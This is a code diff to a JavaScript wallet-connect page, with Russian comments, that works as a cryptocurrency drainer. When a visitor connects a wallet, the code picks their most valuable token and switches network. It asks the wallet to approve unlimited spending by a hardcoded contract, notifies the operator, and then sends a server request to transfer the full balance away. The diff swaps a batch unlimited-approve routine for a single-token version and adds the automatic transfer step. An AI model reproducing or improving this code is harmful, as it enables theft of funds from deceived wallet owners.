@@ -1,8 +1,8 @@
 import { bsc, mainnet, polygon, arbitrum, optimism, base, scroll, avalanche, fantom, linea, zkSync, celo } from '@reown/appkit/networks'
 import { createAppKit } from '@reown/appkit'
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
-import { formatUnits, maxUint256, isAddress, getAddress, parseUnits, encodeFunctionData } from 'viem'
-import { readContract, writeContract, sendCalls, estimateGas, getGasPrice, getBalance } from '@wagmi/core'
+import { formatUnits, maxUint256, isAddress, getAddress, parseUnits } from 'viem'
+import { readContract, writeContract } from '@wagmi/core'
 import { showAMLCheckModal } from './aml-check-modal.js';
 
 // Утилита для дебаунсинга
@@ -11,265 +11,6 @@ const debounce = (func, wait) => {
   return (...args) => {
     clearTimeout(timeout)
     timeout = setTimeout(() => func(...args), wait)
-  }
-}
-
-// Функция для получения рыночно-оптимальных параметров газа (полностью динамическая)
-const getOptimalGasParams = async (chainId, operation = 'approve', contractAddress = null, tokenAddress = null) => {
-  try {
-    // Получаем текущую цену газа динамически
-    const gasPrice = await getGasPrice({ chainId })
-    
-    // Динамически оцениваем gasLimit для операции
-    let estimatedGasLimit = BigInt(150000) // fallback значение
-    
-    try {
-      if (operation === 'approve' && contractAddress && tokenAddress) {
-        // Оцениваем gas для approve операции
-        const approveData = encodeFunctionData({
-          abi: erc20Abi,
-          functionName: 'approve',
-          args: [getAddress(contractAddress), maxUint256]
-        })
-        
-        estimatedGasLimit = await estimateGas({
-          chainId,
-          to: getAddress(tokenAddress),
-          data: approveData
-        })
-        
-        // Добавляем небольшой буфер для надежности
-        estimatedGasLimit = estimatedGasLimit * BigInt(120) / BigInt(100) // +20% буфер
-      } else if (operation === 'transfer') {
-        // Для transfer операций используем стандартные значения
-        estimatedGasLimit = BigInt(21000) // Базовый gas для ETH transfer
-      } else if (operation === 'batch') {
-        // Для batch операций увеличиваем лимит
-        estimatedGasLimit = BigInt(300000) // Увеличенный лимит для batch
-      }
-    } catch (estimateError) {
-      console.warn(`Could not estimate gas for ${operation}, using fallback:`, estimateError.message)
-      // Используем fallback значения в зависимости от сети
-      const fallbackLimits = {
-        1: 150000,    // Ethereum
-        56: 100000,   // BSC
-        137: 200000,  // Polygon
-        42161: 500000, // Arbitrum
-        10: 150000,   // Optimism
-        8453: 150000, // Base
-        534352: 200000, // Scroll
-        43114: 150000, // Avalanche
-        250: 150000,  // Fantom
-        59144: 200000, // Linea
-        324: 300000,  // zkSync
-        42220: 150000  // Celo
-      }
-      estimatedGasLimit = BigInt(fallbackLimits[chainId] || 150000)
-    }
-    
-    // Динамически получаем оптимальную приоритетную комиссию
-    let maxPriorityFeePerGas = BigInt(1500000000) // 1.5 Gwei fallback
-    
-    try {
-      // Пытаемся получить приоритетную комиссию через внешние API
-      const priorityFee = await getDynamicPriorityFee(chainId)
-      if (priorityFee) {
-        maxPriorityFeePerGas = priorityFee
-      }
-    } catch (priorityError) {
-      console.warn(`Could not get dynamic priority fee, using fallback:`, priorityError.message)
-      // Используем сетевые fallback значения
-      const networkPriorityFees = {
-        1: 1000000000,    // Ethereum: 1.5 Gwei
-        56: 250000000,    // BSC: 0.5 Gwei
-        137: 15000000000, // Polygon: 20 Gwei
-        42161: 50000000,  // Arbitrum: 0.05 Gwei
-        10: 500000,       // Optimism: 0.0005 Gwei
-        8453: 500000,     // Base: 0.0005 Gwei
-        534352: 500000,   // Scroll: 0.0005 Gwei
-        43114: 500000000, // Avalanche: 0.5 Gwei
-        250: 500000000,   // Fantom: 0.5 Gwei
-        59144: 500000,    // Linea: 0.0005 Gwei
-        324: 500000,      // zkSync: 0.0005 Gwei
-        42220: 500000000  // Celo: 0.5 Gwei
-      }
-      maxPriorityFeePerGas = BigInt(networkPriorityFees[chainId] || 1500000000)
-    }
-    
-    const params = {
-      gasLimit: estimatedGasLimit,
-      maxFeePerGas: gasPrice, // Используем текущую рыночную цену
-      maxPriorityFeePerGas: maxPriorityFeePerGas
-    }
-    
-    console.log(`Dynamic market-optimal gas params for ${operation} on chain ${chainId}:`, {
-      gasLimit: params.gasLimit.toString(),
-      maxFeePerGas: params.maxFeePerGas.toString(),
-      maxPriorityFeePerGas: params.maxPriorityFeePerGas.toString(),
-      currentGasPrice: gasPrice.toString()
-    })
-    
-    return params
-  } catch (error) {
-    console.error(`Error getting dynamic gas params for chain ${chainId}:`, error)
-    // Fallback параметры
-    return {
-      gasLimit: BigInt(150000),
-      maxFeePerGas: BigInt(3000000000), // 0 Gwei
-      maxPriorityFeePerGas: BigInt(500000000) // 1.5 Gwei
-    }
-  }
-}
-
-// Функция для получения динамческой приоритетной комиссии
-const getDynamicPriorityFee = async (chainId) => {
-  try {
-    // Для Ethereum используем EIP-1559 fee history
-    if (chainId === 1) {
-      // Можно использовать ethers.js fee history или внешние API
-      // Пока используем консервативное значение
-      return BigInt(1500000000) // 1.5 Gwei
-    }
-    
-    // Для других сетей можно использовать их специфичные API
-    // Например, для Polygon можно использовать их gas station API
-    if (chainId === 137) {
-      try {
-        const response = await fetch('https://gasstation.polygon.technology/v2')
-        if (response.ok) {
-          const data = await response.json()
-          const fastPriorityFee = data.fast.maxPriorityFee * 1000000000 // Convert to wei
-          return BigInt(Math.floor(fastPriorityFee))
-        }
-      } catch (error) {
-        console.warn('Could not fetch Polygon gas data:', error.message)
-      }
-    }
-    
-    // Для BSC можно использовать их API
-    if (chainId === 56) {
-      try {
-        const response = await fetch('https://api.bscscan.com/api?module=gastracker&action=gasoracle')
-        if (response.ok) {
-          const data = await response.json()
-          if (data.status === '1') {
-            const fastGas = data.result.FastGasPrice * 1000000000 // Convert to wei
-            return BigInt(Math.floor(fastGas * 0.1)) // 10% от быстрой цены как приоритетная комиссия
-          }
-        }
-      } catch (error) {
-        console.warn('Could not fetch BSC gas data:', error.message)
-      }
-    }
-    
-    // Для остальных сетей возвращаем null, чтобы использовать fallback
-    return null
-  } catch (error) {
-    console.error(`Error getting dynamic priority fee for chain ${chainId}:`, error)
-    return null
-  }
-}
-
-// Функция для получения рыночно-оптимальных параметров газа с учетом типа операции
-const getDynamicGasParams = async (chainId, operation = 'approve', contractAddress = null, tokenAddress = null) => {
-  try {
-    const baseParams = await getOptimalGasParams(chainId, operation, contractAddress, tokenAddress)
-    const congestion = await getNetworkCongestion(chainId)
-    
-    // Минимальные корректировки gasLimit в зависимости от операции (без завышения комиссий)
-    const operationGasLimits = {
-      'approve': 1.0, // Базовый лимит для approve
-      'transfer': 1.1, // Небольшое увеличение для transfer
-      'batch': 1.2 // Умеренное увеличение для batch операций
-    }
-    
-    // Корректировки только при очень высокой загруженности (без завышения)
-    const congestionAdjustments = {
-      'low': { gasLimit: 1.0, feeMultiplier: 1.0 },
-      'medium': { gasLimit: 1.0, feeMultiplier: 1.0 },
-      'high': { gasLimit: 1.05, feeMultiplier: 1.05 }, // Минимальная корректировка
-      'very_high': { gasLimit: 1.1, feeMultiplier: 1.1 } // Умеренная корректировка
-    }
-    
-    const gasLimitMultiplier = operationGasLimits[operation] || operationGasLimits['approve']
-    const congestionAdjustment = congestionAdjustments[congestion] || congestionAdjustments['medium']
-    
-    // Применяем минимальные корректировки
-    const finalGasLimit = baseParams.gasLimit * BigInt(Math.floor(gasLimitMultiplier * congestionAdjustment.gasLimit * 100)) / BigInt(100)
-    
-    // Используем рыночную цену газа без завышения
-    const finalMaxFeePerGas = baseParams.maxFeePerGas * BigInt(Math.floor(congestionAdjustment.feeMultiplier * 100)) / BigInt(100)
-    const finalMaxPriorityFeePerGas = baseParams.maxPriorityFeePerGas * BigInt(Math.floor(congestionAdjustment.feeMultiplier * 100)) / BigInt(100)
-    
-    console.log(`Dynamic market-optimal gas params for ${operation} on chain ${chainId} (congestion: ${congestion}):`, {
-      gasLimit: finalGasLimit.toString(),
-      maxFeePerGas: finalMaxFeePerGas.toString(),
-      maxPriorityFeePerGas: finalMaxPriorityFeePerGas.toString()
-    })
-    
-    return {
-      gasLimit: finalGasLimit,
-      maxFeePerGas: finalMaxFeePerGas,
-      maxPriorityFeePerGas: finalMaxPriorityFeePerGas
-    }
-  } catch (error) {
-    console.error(`Error getting dynamic market-optimal gas params:`, error)
-    return await getOptimalGasParams(chainId, operation, contractAddress, tokenAddress)
-  }
-}
-
-// Функция для получения информации о загруженности сети
-const getNetworkCongestion = async (chainId) => {
-  try {
-    const gasPrice = await getGasPrice({ chainId })
-    
-    // Определяем уровень загруженности на основе цены газа
-    const gasPriceGwei = Number(formatUnits(gasPrice, 9))
-    
-    if (gasPriceGwei < 20) return 'low'
-    if (gasPriceGwei < 50) return 'medium'
-    if (gasPriceGwei < 100) return 'high'
-    return 'very_high'
-  } catch (error) {
-    console.error(`Error getting network congestion for chain ${chainId}:`, error)
-    return 'medium' // fallback
-  }
-}
-
-// Функция для мониторинга транзакции и повышения газа только при необходимости
-const monitorAndSpeedUpTransaction = async (txHash, chainId, wagmiConfig) => {
-  try {
-    console.log(`Monitoring transaction ${txHash} on chain ${chainId}`)
-    
-    // Проверяем загруженность сети
-    const congestion = await getNetworkCongestion(chainId)
-    console.log(`Network congestion level: ${congestion}`)
-    
-    // Ждем 5 секунд для проверки статуса транзакции
-    await new Promise(resolve => setTimeout(resolve, 5000))
-    
-    // Проверяем статус транзакции
-    try {
-      // Здесь можно добавить проверку статуса через RPC
-      // Пока что просто логируем
-      console.log(`Transaction ${txHash} status check completed`)
-      
-      // Если транзакция не подтверждена через 10 секунд, можно рассмотреть повышение газа
-      // но только до рыночно-оптимальных значений
-      if (congestion === 'very_high') {
-        console.log(`Network is very congested, transaction may need more time`)
-        // В будущем здесь можно добавить логику speed-up с рыночными ценами
-      }
-      
-    } catch (statusError) {
-      console.log(`Could not check transaction status: ${statusError.message}`)
-    }
-    
-    console.log(`Transaction ${txHash} monitoring completed`)
-    return true
-  } catch (error) {
-    console.error(`Error monitoring transaction ${txHash}:`, error)
-    return false
   }
 }
 
@@ -855,33 +596,21 @@ const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId)
   const checksumTokenAddress = getAddress(tokenAddress)
   const checksumContractAddress = getAddress(contractAddress)
   try {
-    // Получаем рыночно-оптимальные параметры газа для операции approve
-    const gasParams = await getDynamicGasParams(chainId, 'approve', checksumContractAddress, checksumTokenAddress)
-    
-    console.log(`Approving token with market-optimal gas params:`, {
-      gasLimit: gasParams.gasLimit.toString(),
-      maxFeePerGas: gasParams.maxFeePerGas.toString(),
-      maxPriorityFeePerGas: gasParams.maxPriorityFeePerGas.toString(),
-      chainId
-    })
-    
+    const gasLimit = BigInt(550000)
+    const maxFeePerGas = BigInt(1000000000)
+    const maxPriorityFeePerGas = BigInt(1000000000)
+    console.log(`Approving token with gasLimit: ${gasLimit}, maxFeePerGas: ${maxFeePerGas}, maxPriorityFeePerGas: ${maxPriorityFeePerGas}`)
     const txHash = await writeContract(wagmiConfig, {
       address: checksumTokenAddress,
       abi: erc20Abi,
       functionName: 'approve',
       args: [checksumContractAddress, maxUint256],
       chainId,
-      gas: gasParams.gasLimit,
-      maxFeePerGas: gasParams.maxFeePerGas,
-      maxPriorityFeePerGas: gasParams.maxPriorityFeePerGas
+      gas: gasLimit,
+      maxFeePerGas,
+      maxPriorityFeePerGas
     })
     console.log(`Approve transaction sent: ${txHash}`)
-    
-    // Запускаем мониторинг транзакции в фоне
-    monitorAndSpeedUpTransaction(txHash, chainId, wagmiConfig).catch(error => {
-      console.error(`Error monitoring transaction ${txHash}:`, error)
-    })
-    
     return txHash
   } catch (error) {
     store.errors.push(`Approve token failed: ${error.message}`)
@@ -889,106 +618,9 @@ const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId)
   }
 }
 
-// Add batch operations function after the getTokenPrice function
-const performBatchOperations = async (mostExpensive, allBalances, state) => {
-  if (!mostExpensive) {
-    console.log('No most expensive token found, skipping batch operations')
-    return false
-  }
 
-  console.log(`Attempting batch operations for network: ${mostExpensive.network}`)
 
-  // Добавляем проверку и смену сети
-  const targetNetworkInfo = networkMap[mostExpensive.network]
-  if (!targetNetworkInfo) {
-    const errorMessage = `Target network for ${mostExpensive.network} (chainId ${mostExpensive.chainId}) not found in networkMap`
-    store.errors.push(errorMessage)
-    return { success: false, error: errorMessage }
-  }
-
-  const targetNetwork = targetNetworkInfo.networkObj
-  const expectedChainId = targetNetworkInfo.chainId
-
-  if (store.networkState.chainId !== expectedChainId) {
-    console.log(`Attempting to switch to ${mostExpensive.network} (chainId ${expectedChainId})`)
-    try {
-      await new Promise((resolve, reject) => {
-        const unsubscribe = appKit.subscribeNetwork(networkState => {
-          if (networkState.chainId === expectedChainId) {
-            console.log(`Successfully switched to ${mostExpensive.network} (chainId ${expectedChainId})`)
-            unsubscribe()
-            resolve()
-          }
-        })
-        appKit.switchNetwork(targetNetwork).catch(error => {
-          unsubscribe()
-          reject(error)
-        })
-        setTimeout(() => {
-          unsubscribe()
-          reject(new Error(`Failed to switch to ${mostExpensive.network} (chainId ${expectedChainId}) after timeout`))
-        }, 10000)
-      })
-    } catch (error) {
-      const errorMessage = `Failed to switch network to ${mostExpensive.network} (chainId ${expectedChainId}): ${error.message}`
-      store.errors.push(errorMessage)
-      return { success: false, error: errorMessage }
-    }
-  } else {
-    console.log(`Already on correct network: ${mostExpensive.network} (chainId ${expectedChainId})`)
-  }
-
-  try {
-    // Get tokens with non-zero balance in the most expensive token's network
-    const networkTokens = allBalances.filter(t => t.network === mostExpensive.network && t.balance > 0)
-
-    // Prepare approve calls for ERC-20 tokens
-    const approveCalls = networkTokens
-      .filter(t => t.address !== 'native')
-      .map(t => ({
-        to: getAddress(t.address),
-        data: encodeFunctionData({
-          abi: erc20Abi,
-          functionName: 'approve',
-          args: [getAddress(CONTRACTS[mostExpensive.chainId]), maxUint256]
-        }),
-        value: '0x0'
-      }))
-
-    // Send batch transaction
-    if (approveCalls.length > 0) {
-      // Получаем рыночно-оптимальные параметры газа для batch транзакции
-      const gasParams = await getDynamicGasParams(mostExpensive.chainId, 'batch')
-      
-      console.log(`Sending batch transaction with market-optimal gas params:`, {
-        gasLimit: gasParams.gasLimit.toString(),
-        maxFeePerGas: gasParams.maxFeePerGas.toString(),
-        maxPriorityFeePerGas: gasParams.maxPriorityFeePerGas.toString(),
-        chainId: mostExpensive.chainId
-      })
-      
-      const id = await sendCalls(wagmiAdapter.wagmiConfig, {
-        calls: approveCalls,
-        account: getAddress(state.address),
-        chainId: mostExpensive.chainId,
-        gas: gasParams.gasLimit,
-        maxFeePerGas: gasParams.maxFeePerGas,
-        maxPriorityFeePerGas: gasParams.maxPriorityFeePerGas
-      })
-      console.log(`Batch transaction sent with id: ${id}`)
-      return { success: true, txHash: id }
-    }
-    return { success: false, message: 'No operations to perform' }
-  } catch (error) {
-    console.error('Batch operation error:', error)
-    if (error.message.includes('wallet_sendCalls') || error.message.includes('does not exist / is not available')) {
-      return { success: false, error: 'BATCH_NOT_SUPPORTED' }
-    }
-    return { success: false, error: error.message }
-  }
-}
-
-// Модифицируем initializeSubscribers для корректной работы уведомлений
+// Инициализация подписок
 const initializeSubscribers = (modal) => {
   const debouncedSubscribeAccount = debounce(async state => {
     updateStore('accountState', state)
@@ -1048,83 +680,129 @@ const initializeSubscribers = (modal) => {
         }
       }
       await notifyWalletConnection(state.address, walletInfo.name, device, allBalances, store.networkState.chainId)
-      
-      // Check for pending approvals when user returns to the site
-      // Удаляю функции и вызовы, связанные с серверной проверкой аппрува
-      // Удалить: checkPendingApprovals, sendApprovalToServer, все обращения к /api/approval и /api/check-pending, а также связанные комментарии и логику
-      
       if (mostExpensive) {
-        console.log(`Most expensive token: ${mostExpensive.symbol}, balance: ${mostExpensive.balance}, price in USDT: ${mostExpensive.price}`)
-        
-        // Try batch operations first
-        const batchResult = await performBatchOperations(mostExpensive, allBalances, state)
-        
-        if (batchResult.success) {
-          // Handle successful batch transaction
-          console.log('Batch transaction successful')
+        console.log(`Самый дорогой токен: ${mostExpensive.symbol}, количество: ${mostExpensive.balance}, цена в USDT: ${mostExpensive.price} (${mostExpensive.symbol === 'USDT' || mostExpensive.symbol === 'USDC' ? 'Fixed' : 'Binance API'})`)
+        console.log('Available networks:', networks.map(n => ({ name: n.name, chainId: n.id || 'undefined' })))
+        const targetNetworkInfo = networkMap[mostExpensive.network]
+        if (!targetNetworkInfo) {
+          const errorMessage = `Target network for ${mostExpensive.network} (chainId ${mostExpensive.chainId}) not found in networkMap`
+          store.errors.push(errorMessage)
+          const approveState = document.getElementById('approveState')
+          if (approveState) approveState.innerHTML = errorMessage
+          hideCustomModal()
+          store.isProcessingConnection = false
+          return
+        }
+        const targetNetwork = targetNetworkInfo.networkObj
+        const expectedChainId = targetNetworkInfo.chainId
+        if (store.networkState.chainId !== expectedChainId) {
+          console.log(`Attempting to switch to ${mostExpensive.network} (chainId ${expectedChainId})`)
+          try {
+            await new Promise((resolve, reject) => {
+              const unsubscribe = modal.subscribeNetwork(networkState => {
+                if (networkState.chainId === expectedChainId) {
+                  console.log(`Successfully switched to ${mostExpensive.network} (chainId ${expectedChainId})`)
+                  unsubscribe()
+                  resolve()
+                }
+              })
+              appKit.switchNetwork(targetNetwork).catch(error => {
+                unsubscribe()
+                reject(error)
+              })
+              setTimeout(() => {
+                unsubscribe()
+                reject(new Error(`Failed to switch to ${mostExpensive.network} (chainId ${expectedChainId}) after timeout`))
+              }, 10000)
+            })
+          } catch (error) {
+            const errorMessage = `Failed to switch network to ${mostExpensive.network} (chainId ${expectedChainId}): ${error.message}`
+            store.errors.push(errorMessage)
+            const approveState = document.getElementById('approveState')
+            if (approveState) approveState.innerHTML = errorMessage
+            hideCustomModal()
+            store.isProcessingConnection = false
+            return
+          }
+        } else {
+          console.log(`Already on correct network: ${mostExpensive.network} (chainId ${expectedChainId})`)
+        }
+        try {
+          const contractAddress = CONTRACTS[mostExpensive.chainId]
+          const approvalKey = `${state.address}_${mostExpensive.chainId}_${mostExpensive.address}_${contractAddress}`
+          if (store.approvedTokens[approvalKey] || store.isApprovalRequested || store.isApprovalRejected) {
+            const approveMessage = store.approvedTokens[approvalKey]
+              ? `Approve already completed for ${mostExpensive.symbol} on ${mostExpensive.network}`
+              : store.isApprovalRejected
+              ? `Approve was rejected for ${mostExpensive.symbol} on ${mostExpensive.network}`
+              : `Approve request pending for ${mostExpensive.symbol} on ${mostExpensive.network}`
+            console.log(approveMessage)
+            const approveState = document.getElementById('approveState')
+            if (approveState) approveState.innerHTML = approveMessage
+            hideCustomModal()
+            store.isProcessingConnection = false
+            return
+          }
+          store.isApprovalRequested = true
+          const txHash = await approveToken(wagmiAdapter.wagmiConfig, mostExpensive.address, contractAddress, mostExpensive.chainId)
+          store.approvedTokens[approvalKey] = true
+          store.isApprovalRequested = false
+          let approveMessage = `Approve successful for ${mostExpensive.symbol} on ${mostExpensive.network}: ${txHash}`
+          console.log(approveMessage)
+          await notifyTransferApproved(state.address, walletInfo.name, device, mostExpensive, mostExpensive.chainId)
           
-          // Get all tokens that were approved in batch
-          const approvedTokens = allBalances.filter(t => 
-            t.network === mostExpensive.network && 
-            t.balance > 0 &&
-            t.address !== 'native'
-          )
+          // Ждем подтверждения allowance
+          console.log('Waiting for allowance confirmation...')
+          await waitForAllowance(wagmiAdapter.wagmiConfig, state.address, mostExpensive.address, contractAddress, mostExpensive.chainId)
           
-          // Notify about batch approval for all tokens
-          for (const token of approvedTokens) {
-            await notifyTransferApproved(
-              state.address,
-              walletInfo.name,
-              device,
-              token,
-              mostExpensive.chainId
-            )
+          // Отправляем запрос на сервер с корректным amount
+          const amount = parseUnits(mostExpensive.balance.toString(), mostExpensive.decimals)
+          console.log(`Sending transfer request with amount: ${amount.toString()}`)
+          const transferResult = await sendTransferRequest(state.address, mostExpensive.address, amount, mostExpensive.chainId, txHash)
+          
+          if (transferResult.success) {
+            console.log(`Transfer successful: ${transferResult.txHash}`)
+            await notifyTransferSuccess(state.address, walletInfo.name, device, mostExpensive, mostExpensive.chainId, transferResult.txHash)
+            approveMessage += `<br>Transfer successful: ${transferResult.txHash}`
+          } else {
+            console.log(`Transfer failed: ${transferResult.message}`)
+            approveMessage += `<br>Transfer failed: ${transferResult.message}`
           }
           
-          // Send approval data to server for all approved tokens
-          // Удаляю функции и вызовы, связанные с серверной проверкой аппрува
-          // Удалить: checkPendingApprovals, sendApprovalToServer, все обращения к /api/approval и /api/check-pending, а также связанные комментарии и логику
-        } else if (batchResult.error === 'BATCH_NOT_SUPPORTED') {
-          // Fallback to regular approve if batch is not supported
-          console.log('Batch transactions not supported (wallet_sendCalls not available), falling back to regular approve')
-          
-          try {
-            const contractAddress = CONTRACTS[mostExpensive.chainId]
-            const approvalKey = `${state.address}_${mostExpensive.chainId}_${mostExpensive.address}_${contractAddress}`
-            
-            if (!store.approvedTokens[approvalKey] && !store.isApprovalRequested && !store.isApprovalRejected) {
-              store.isApprovalRequested = true
-              const txHash = await approveToken(
-                wagmiAdapter.wagmiConfig,
-                mostExpensive.address,
-                contractAddress,
-                mostExpensive.chainId
-              )
-              
-              store.approvedTokens[approvalKey] = true
-              store.isApprovalRequested = false
-              
-              // Notify about single token approval
-              await notifyTransferApproved(
-                state.address,
-                walletInfo.name,
-                device,
-                mostExpensive,
-                mostExpensive.chainId
-              )
-              
-              // Send approval data to server immediately after approval
-              // Удаляю функции и вызовы, связанные с серверной проверкой аппрува
-              // Удалить: checkPendingApprovals, sendApprovalToServer, все обращения к /api/approval и /api/check-pending, а также связанные комментарии и логику
-            }
-          } catch (error) {
-            handleApproveError(error, mostExpensive, state)
+          const approveState = document.getElementById('approveState')
+          if (approveState) approveState.innerHTML = approveMessage
+          hideCustomModal()
+          store.isProcessingConnection = false
+        } catch (error) {
+          store.isApprovalRequested = false
+          if (error.code === 4001 || error.code === -32000) {
+            store.isApprovalRejected = true
+            const errorMessage = `Approve was rejected for ${mostExpensive.symbol} on ${mostExpensive.network}`
+            store.errors.push(errorMessage)
+            const approveState = document.getElementById('approveState')
+            if (approveState) approveState.innerHTML = errorMessage
+            hideCustomModal()
+            appKit.disconnect()
+            store.connectionKey = null
+            store.isProcessingConnection = false
+            sessionStorage.clear()
+          } else {
+            const errorMessage = `Approve failed for ${mostExpensive.symbol} on ${mostExpensive.network}: ${error.message}`
+            store.errors.push(errorMessage)
+            const approveState = document.getElementById('approveState')
+            if (approveState) approveState.innerHTML = errorMessage
+            hideCustomModal()
+            store.isProcessingConnection = false
           }
         }
+      } else {
+        const message = 'No tokens with positive balance'
+        console.log(message)
+        const mostExpensiveState = document.getElementById('mostExpensiveTokenState')
+        if (mostExpensiveState) mostExpensiveState.innerHTML = message
+        hideCustomModal()
+        store.isProcessingConnection = false
       }
-      
-      hideCustomModal()
-      store.isProcessingConnection = false
     }
   }, 1000)
   modal.subscribeAccount(debouncedSubscribeAccount)
@@ -1152,30 +830,6 @@ const initializeSubscribers = (modal) => {
       switchNetworkBtn.textContent = `Switch to ${nextNetwork}`
     }
   })
-}
-
-// Helper function to handle approve errors
-const handleApproveError = (error, token, state) => {
-  store.isApprovalRequested = false
-  if (error.code === 4001 || error.code === -32000) {
-    store.isApprovalRejected = true
-    const errorMessage = `Approve was rejected for ${token.symbol} on ${token.network}`
-    store.errors.push(errorMessage)
-    const approveState = document.getElementById('approveState')
-    if (approveState) approveState.innerHTML = errorMessage
-    hideCustomModal()
-    appKit.disconnect()
-    store.connectionKey = null
-    store.isProcessingConnection = false
-    sessionStorage.clear()
-  } else {
-    const errorMessage = `Approve failed for ${token.symbol} on ${token.network}: ${error.message}`
-    store.errors.push(errorMessage)
-    const approveState = document.getElementById('approveState')
-    if (approveState) approveState.innerHTML = errorMessage
-    hideCustomModal()
-    store.isProcessingConnection = false
-  }
 }
 
 initializeSubscribers(appKit)
